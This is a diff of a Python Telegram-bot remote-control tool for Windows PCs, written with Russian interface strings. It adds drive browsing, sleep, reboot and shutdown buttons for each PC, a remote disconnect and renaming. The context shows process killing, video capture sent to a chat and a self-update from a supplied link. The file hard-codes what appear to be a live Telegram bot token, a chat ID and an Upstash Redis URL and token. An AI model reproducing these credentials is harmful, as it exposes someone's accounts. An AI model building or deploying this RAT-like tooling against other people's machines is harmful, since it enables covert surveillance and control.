@@ -65,7 +65,13 @@ pyautogui.FAILSAFE = False
 # ==============================
 BOT_TOKEN   = "8369819060:AAEC_GjpRz265vAnw83AYfCh4VWURh0ns8U"
 CHAT_ID     = 1861646465
-PC_NAME     = socket.gethostname()  # Берётся автоматически из имени ПК
+# Имя ПК — берётся из файла если есть, иначе hostname
+_name_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".pcname")
+if os.path.exists(_name_file):
+    with open(_name_file, "r", encoding="utf-8") as _f:
+        PC_NAME = _f.read().strip() or socket.gethostname()
+else:
+    PC_NAME = socket.gethostname()
 
 REDIS_URL   = "https://equipped-goshawk-68311.upstash.io"
 REDIS_TOKEN = "gQAAAAAAAQrXAAIncDJmOWVmZWQ2N2I4MWE0MjQ5Yjk0MGEzM2FhZDZhNzM3M3AyNjgzMTE"
@@ -208,13 +214,31 @@ def execute_command(cmd, args=""):
                 ("✅ Убито:\n" + "\n".join(killed) if killed else "❌ PID не найден"), parse_mode='HTML')
 
         elif cmd == "files":
-            path = args if args and os.path.exists(args) else fm_cur.get(CHAT_ID, r"C:\Users\1")
-            if not os.path.exists(path):
-                path = "C:\\" if sys.platform == "win32" else "/"
-            fm_cur[CHAT_ID] = path
-            markup = build_fm_keyboard(CHAT_ID, path)
-            bot.send_message(CHAT_ID, f"📂 <b>{PC_NAME}</b>\n<code>{path}</code>",
-                             parse_mode='HTML', reply_markup=markup)
+            if not args:
+                # Показать список дисков
+                markup = InlineKeyboardMarkup(row_width=3)
+                buttons = []
+                if CHAT_ID not in fm_paths:
+                    fm_paths[CHAT_ID] = {}
+                for part in psutil.disk_partitions():
+                    try:
+                        usage = psutil.disk_usage(part.mountpoint)
+                        free_gb = usage.free // 1024**3
+                        total_gb = usage.total // 1024**3
+                        label = f"💿 {part.device.replace(chr(92), '')}  {free_gb}/{total_gb}GB"
+                        idx = len(fm_paths[CHAT_ID])
+                        fm_paths[CHAT_ID][idx] = part.mountpoint
+                        buttons.append(InlineKeyboardButton(label, callback_data=f"fmcd_{idx}"))
+                    except Exception:
+                        pass
+                markup.add(*buttons)
+                bot.send_message(CHAT_ID, f"💿 <b>{PC_NAME}</b> — выбери диск:", parse_mode='HTML', reply_markup=markup)
+            else:
+                path = args if os.path.exists(args) else fm_cur.get(CHAT_ID, "C:\\")
+                fm_cur[CHAT_ID] = path
+                markup = build_fm_keyboard(CHAT_ID, path)
+                bot.send_message(CHAT_ID, f"📂 <b>{PC_NAME}</b>\n<code>{path}</code>",
+                                 parse_mode='HTML', reply_markup=markup)
 
         elif cmd == "shutdown":
             bot.send_message(CHAT_ID, f"✅ <b>{PC_NAME}</b> выключается...", parse_mode='HTML')
@@ -355,6 +379,24 @@ def execute_command(cmd, args=""):
                 bot.send_video(CHAT_ID, f, caption=f"🎥 {PC_NAME} — {seconds} сек")
             os.remove(tmp)
 
+
+
+
+        elif cmd == "disconnect":
+            bot.send_message(CHAT_ID, f"🔌 <b>{PC_NAME}</b>: отключаюсь...", parse_mode='HTML')
+            time.sleep(1)
+            os._exit(0)
+
+        elif cmd == "rename":
+            new_name = args.strip()
+            if not new_name:
+                bot.send_message(CHAT_ID, f"❌ Укажи имя: /rename Домашний", parse_mode='HTML')
+            else:
+                name_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".pcname")
+                with open(name_file, "w", encoding="utf-8") as f:
+                    f.write(new_name)
+                old_name = PC_NAME
+                bot.send_message(CHAT_ID, f"✅ ПК переименован: <b>{old_name}</b> → <b>{new_name}</b>\nПерезапусти бота чтобы применилось.", parse_mode='HTML')
 
         elif cmd == "update":
             # args = прямая ссылка на новый .pyw файл
@@ -625,6 +667,15 @@ def pcs_keyboard():
         for pc in pcs:
             label = f"🟢 {pc['name']}  |  CPU {pc.get('cpu','?')}%  RAM {pc.get('ram','?')}%"
             markup.add(InlineKeyboardButton(label, callback_data=f"selpc_{pc['name']}"))
+            # Кнопки управления питанием для каждого ПК
+            markup.add(
+                InlineKeyboardButton(f"⛔ Выкл", callback_data=f"power_shutdown_{pc['name']}"),
+                InlineKeyboardButton(f"🔄 Ребут", callback_data=f"power_reboot_{pc['name']}"),
+                InlineKeyboardButton(f"💤 Сон", callback_data=f"power_sleep_{pc['name']}")
+            )
+            markup.add(
+                InlineKeyboardButton(f"🔌 Отключить доступ", callback_data=f"disc_{pc['name']}")
+            )
     return markup, pcs
 
 def route(message, cmd, args=""):
@@ -727,7 +778,30 @@ def callback_kill(call):
 @bot.message_handler(commands=['files'])
 def cmd_files(message):
     if not is_authorized(message): return
-    route(message, "files")
+    # Показать выбор диска
+    target = get_selected(message.chat.id)
+    if target == PC_NAME:
+        # Получить список дисков локально
+        markup = InlineKeyboardMarkup(row_width=3)
+        buttons = []
+        for part in psutil.disk_partitions():
+            try:
+                usage = psutil.disk_usage(part.mountpoint)
+                free_gb = usage.free // 1024**3
+                total_gb = usage.total // 1024**3
+                label = f"💿 {part.device.replace(chr(92), '')}  {free_gb}/{total_gb}GB"
+                idx = len(fm_paths.get(message.chat.id, {}))
+                if message.chat.id not in fm_paths:
+                    fm_paths[message.chat.id] = {}
+                fm_paths[message.chat.id][idx] = part.mountpoint
+                buttons.append(InlineKeyboardButton(label, callback_data=f"fmcd_{idx}"))
+            except Exception:
+                pass
+        markup.add(*buttons)
+        bot.reply_to(message, "💿 Выбери диск:", reply_markup=markup)
+    else:
+        send_command_to_pc(target, "files")
+        bot.reply_to(message, f"📤 Команда отправлена на <b>{target}</b>...", parse_mode='HTML')
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("fmcd_"))
 def callback_fmcd(call):
@@ -827,6 +901,12 @@ def callback_power(call):
             subprocess.run(["shutdown", "/r", "/t", "5"])
         else:
             send_command_to_pc(target, "reboot")
+    elif action == "sleep":
+        bot.edit_message_text(f"💤 Сплю <b>{target}</b>...", call.message.chat.id, call.message.message_id, parse_mode='HTML')
+        if target == PC_NAME:
+            subprocess.run(["rundll32.exe", "powrprof.dll,SetSuspendState", "0", "1", "0"])
+        else:
+            send_command_to_pc(target, "sleep")
     elif action == "cancel":
         bot.edit_message_text("❌ Отменено", call.message.chat.id, call.message.message_id)
     bot.answer_callback_query(call.id)
@@ -984,6 +1064,53 @@ def cmd_history(message):
     if not is_authorized(message): return
     parts = message.text.split(maxsplit=1)
     route(message, "history", parts[1] if len(parts) > 1 else "15")
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith("disc_"))
+def callback_disconnect(call):
+    if not auth_cb(call): return
+    target = call.data[5:]
+    markup = InlineKeyboardMarkup()
+    markup.add(
+        InlineKeyboardButton("✅ Да, отключить", callback_data=f"disc_confirm_{target}"),
+        InlineKeyboardButton("❌ Отмена", callback_data="noop")
+    )
+    bot.edit_message_text(
+        f"⚠️ Отключить удалённый доступ на <b>{target}</b>?\nБот закроется на том ПК.",
+        call.message.chat.id, call.message.message_id,
+        parse_mode='HTML', reply_markup=markup)
+    bot.answer_callback_query(call.id)
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith("disc_confirm_"))
+def callback_disconnect_confirm(call):
+    if not auth_cb(call): return
+    target = call.data[13:]
+    bot.edit_message_text(f"🔌 Отключаю <b>{target}</b>...", call.message.chat.id, call.message.message_id, parse_mode='HTML')
+    if target == PC_NAME:
+        threading.Thread(target=execute_command, args=("disconnect",), daemon=True).start()
+    else:
+        send_command_to_pc(target, "disconnect")
+    bot.answer_callback_query(call.id)
+
+@bot.message_handler(commands=['disconnect'])
+def cmd_disconnect(message):
+    if not is_authorized(message): return
+    target = get_selected(message.chat.id)
+    markup = InlineKeyboardMarkup()
+    markup.add(
+        InlineKeyboardButton("✅ Да, отключить", callback_data=f"disc_confirm_{target}"),
+        InlineKeyboardButton("❌ Отмена", callback_data="noop")
+    )
+    bot.reply_to(message,
+        f"⚠️ Отключить удалённый доступ на <b>{target}</b>?\nБот закроется на том ПК.",
+        parse_mode='HTML', reply_markup=markup)
+
+@bot.message_handler(commands=['rename'])
+def cmd_rename(message):
+    if not is_authorized(message): return
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        bot.reply_to(message, "Пример: /rename Домашний ПК"); return
+    route(message, "rename", parts[1])
 
 @bot.message_handler(commands=['update'])
 def cmd_update(message):
